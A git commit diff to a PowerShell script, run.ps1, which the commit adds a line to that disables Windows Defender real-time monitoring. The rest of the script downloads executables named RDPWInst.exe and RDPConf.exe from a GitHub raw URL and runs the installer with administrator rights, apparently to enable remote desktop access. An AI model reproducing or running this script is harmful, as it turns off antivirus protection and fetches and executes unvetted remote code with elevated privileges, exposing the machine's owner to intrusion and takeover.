756893080fdd1dc6723d26bb90676c9d83cf9ae1
Assnsster <nghoangviet202@gmail.com>
2026-05-05 22:09:55 +0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,3 +1,4 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
 Invoke-WebRequest "https://raw.githubusercontent.com/Assnsster/archiver1/refs/heads/main/RDPWInst.exe" -OutFile "$env:TEMP\RDPWInst.exe"
 Start-Process "$env:TEMP\RDPWInst.exe" -ArgumentList "-i -o" -Verb RunAs -Wait
 Invoke-WebRequest "https://raw.githubusercontent.com/Assnsster/archiver1/refs/heads/main/RDPConf.exe" -OutFile "$env:USERPROFILE\AppData\Local\Microsoft\WindowsApps\RDPConf.exe"
